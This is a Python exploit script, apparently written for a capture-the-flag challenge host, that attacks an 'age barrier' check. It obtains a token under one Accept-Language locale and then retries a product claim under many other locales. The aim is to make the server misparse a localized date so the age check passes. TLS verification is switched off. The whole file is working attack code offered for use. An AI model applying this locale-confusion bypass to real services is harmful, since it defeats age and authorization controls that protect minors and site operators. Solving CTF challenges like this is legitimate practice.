
# exploit_agebarrier.py
# Requires: requests
#
# Usage: python3 exploit_agebarrier.py

import requests
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE = "https://d0172ccd-4c60-4154-afd5-f8b291fef6c7.chall.nnsc.tf"  # change if needed
TIMEOUT = 10

def issue_token(session, issue_locale="en-US"):
    headers = {"Accept-Language": issue_locale}
    r = session.post(f"{BASE}/tokens", headers=headers, timeout=TIMEOUT, verify=False)
    r.raise_for_status()
    return r.json()["token"]

def try_claim(session, token, product_id=3, accept_language=None):
    headers = {}
    if accept_language:
        headers["Accept-Language"] = accept_language
    payload = {"token": token}
    r = session.post(f"{BASE}/products/{product_id}", json=payload, headers=headers, timeout=TIMEOUT, verify=False)
    return r

def main():
    s = requests.Session()
    print("[*] Issuing token...")
    try:
        token = issue_token(s, issue_locale="en-US")
    except Exception as e:
        print("[-] Failed to issue token:", e)
        sys.exit(1)
    print("[+] Got token (length {})".format(len(token)))

    # Locales to try for parsing/verification — we try many common ones.
    # The goal is a locale that, when parsing the localized short date string,
    # causes the parsed year to be interpreted as ancient (e.g. '25' -> year 25).
    locales = [
        "en-US", "en-GB", "fr-FR", "de-DE", "sv-SE", "fi-FI", "nl-NL",
        "it-IT", "es-ES", "pt-BR", "ru-RU", "zh-CN", "ja-JP", "ar-SA",
        "ko-KR", "da-DK", "nb-NO", "pl-PL", "cs-CZ"
    ]

    print("[*] Trying claim with different Accept-Language values...")
    for loc in locales:
        try:
            r = try_claim(s, token, product_id=3, accept_language=loc)
            status = r.status_code
            if status == 200:
                try:
                    body = r.json()
                except Exception:
                    body = r.text
                print(f"[!!!] Success with Accept-Language: {loc}")
                print("Response:", body)
                return
            else:
                print(f"[-] {loc}: HTTP {status}")
        except Exception as e:
            print(f"[-] {loc}: request failed ({e})")

    print("[*] None of the tested locales succeeded. You can try more locales or tweak issuance locale.")
    print("Tip: issue token with one locale and attempt verification (claim) with a different Accept-Language.")

if __name__ == "__main__":
    main()

